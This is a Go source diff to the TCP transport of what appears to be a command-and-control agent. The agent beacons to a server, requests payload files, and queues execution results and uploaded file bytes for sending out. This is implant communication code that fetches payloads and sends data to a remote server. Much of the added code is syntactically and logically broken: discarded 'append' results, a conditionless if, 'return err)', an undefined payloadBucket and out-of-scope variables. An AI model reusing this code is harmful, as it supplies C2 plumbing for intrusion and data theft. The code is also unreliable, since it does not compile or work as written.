@@ -16,22 +16,21 @@ import (
 
 type TCP struct {
 	conn                net.Conn
-	name                string
-	serverAddr          string
-	serverIp            string
-	serverPort          string
-	instructionBucket   [][]byte
-	payloadBucket       map[string]*payloadRecord
-	responseBucket      [][]byte
-	proxyToClientBucket [][]byte
-	proxyToServerBucket [][]byte
+	name                 string
+	serverAddr           string
+	serverIp             string
+	serverPort           string
+	instructionBucket    [][]byte
+	payloadBucket        map[string]*payloadRecord
+	outgoingBucket       [][]byte
+	proxyToClientBucket  [][]byte
+	proxyToServerBucket  [][]byte
 	// payloadRequestBucket [][]byte
 	// payloadBucket        map[string][]byte
 }
 
 type payloadRecord struct {
 	sync.Mutex
-	request   string
 	bytes     []byte
 	waitCount int
 
@@ -110,6 +109,8 @@ func (t *TCP) listenAndHandleIncoming(profile map[string]interface{}) {
 					t.instructionBucket = append(t.instructionBucket, []byte(messageWrapper["message"].(string)))
 				} else if messageWrapper["messageType"] == "proxy" {
 					t.proxyToClientBucket = append(t.proxyToClientBucket, []byte(messageWrapper["message"].(string)))
+				} else if messageWrapper["messageType"] == "payload"{
+					handlePayloadResponse(messageWrapper["message"])
 				} else {
 					output.VerbosePrint(fmt.Sprintf("[-] TCP Message Type not recognized: %s", messageWrapper["messageType"]))
 				}
@@ -126,6 +127,49 @@ func (t *TCP) listenAndHandleIncoming(profile map[string]interface{}) {
 			// conn.Write(jdata)
 		}
 	}
+}
+
+func handlePayloadResponse(payloadMessage []byte) {
+	/*
+		This function processes received Payload responses. It stores the payload bytes returned into the appropriate
+			payloadRec, and then broadcasts to all waiting payload requests that the payload has been retrieved.
+	*/
+	var payloadResponse map[string]interface{}
+	if err := json.Unmarshal(payloadMessage, &payloadResponse) {
+		output.VerbosePrint(fmt.Sprintf("[-] Malformed TCP message received: %s", err.Error()))
+	} else {
+		if payloadName, ok := payloadResponse["filename"]; !ok {
+			output.VerbosePrint(fmt.Sprintf("[-] Payload response did not include filename"))
+		}
+		if payloadRec, ok := payloadBucket[payloadName]; !ok {
+			output.VerbosePrint(fmt.Sprintf("[-] Payload returned, but no payload record for: %s", payloadName))
+		}
+		if payloadBytes, ok := payloadResponse["bytes"]; !ok {
+			output.VerbosePrint(fmt.Sprintf("[-] Payload response did not include file bytes for: %s", payloadName))
+		}
+
+		payloadRec.Lock()
+		payloadRec.bytes = payloadBytes
+		payloadRec.cond.Broadcast()
+		payloadRec.Unlock()
+	}
+}
+
+func (t *TCP) handleOutgoing() {
+	/*
+		This function keeps going through payloadBucket and outgoingBucket, and sends the entries in each to the server.
+	*/
+	for true {
+		for len(t.outgoingBucket) > 0 {
+			response := t.outgoingBucket[0]
+			t.conn.Write(response)
+			t.outgoingBucket = t.outgoingBucket[1:]
+		}
+	}
+}
+
+func (t *TCP) handleProxy() {
+	
 }
 
 func (t *TCP) GetBeaconBytes(profile map[string]interface{}) []byte {
@@ -156,8 +200,8 @@ func (t *TCP) GetPayloadBytes(profile map[string]interface{}, payload string) ([
 	} else {
 		//payload request does not exist yet, we need to make a new one, and populate request fields
 		payloadRec = newPayloadRecord()
-		t.payloadBucket[payload] = payloadRec
 		payloadRec.waitCount = 1
+		t.payloadBucket[payload] = payloadRec
 
 		requestFields := make(map[string]interface{})
 		requestFields["messageType"] = "payloadRequest"
@@ -169,13 +213,13 @@ func (t *TCP) GetPayloadBytes(profile map[string]interface{}, payload string) ([
 		if err != nil {
 			output.VerbosePrint(fmt.Sprintf("[-] Cannot send payload request. Error with profile marshal: %s", err.Error()))
 		} else {
-			payloadRec.request = request
+			append(t.outgoingBucket, request)
 		}
 	}
 
-	payloadRec.cond.L.Lock()
+	payloadRec.Lock()
 	payloadRec.cond.Wait()
-	payloadRec.cond.L.Unlock()
+	payloadRec.Unlock()
 
 	payloadBytes := payloadRec.bytes
 
@@ -183,10 +227,10 @@ func (t *TCP) GetPayloadBytes(profile map[string]interface{}, payload string) ([
 		// we are the only request waiting for the payload, so now that we have the payload we can delete the entry
 		delete(t.payloadBucket, payload)
 	} else {
-		payloadRec.cond.L.Lock()
+		payloadRec.Lock()
 		// there are other requests waiting for the payload, so we'll just decrement the counter
 		payloadRec.waitCount -= 1
-		payloadRec.cond.L.Lock()
+		payloadRec.Unlock()
 	}
 
 	return payloadBytes, payloadName
@@ -194,7 +238,7 @@ func (t *TCP) GetPayloadBytes(profile map[string]interface{}, payload string) ([
 
 func (t *TCP) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
 	/*
-		This function adds execution output to the responseBucket for handleOutgoing() to process
+		This function adds execution output to the outgoingBucket for handleOutgoing() to process
 	*/
 
 	profileCopy := make(map[string]interface{})
@@ -210,7 +254,7 @@ func (t *TCP) SendExecutionResults(profile map[string]interface{}, result map[st
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Cannot send results. Error with profile marshal: %s", err.Error()))
 	} else {
-		append(t.responseBucket, data)
+		append(t.outgoingBucket, data)
 	}
 }
 
@@ -224,7 +268,7 @@ func (t *TCP) SetUpstreamDestAddr(upstreamDestAddr string) {
 
 func (t *TCP) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
 	/*
-		This function generates a file upload request and appends it to responseBucket.
+		This function generates a file upload request and appends it to outgoingBucket.
 		handleOutgoing then processes the request.
 	*/
 
@@ -237,7 +281,7 @@ func (t *TCP) UploadFileBytes(profile map[string]interface{}, uploadName string,
 	if err != nil {
 		return err)
 	} else {
-		append(t.responseBucket, data)
+		append(t.outgoingBucket, data)
 	}
 	return nil
 }
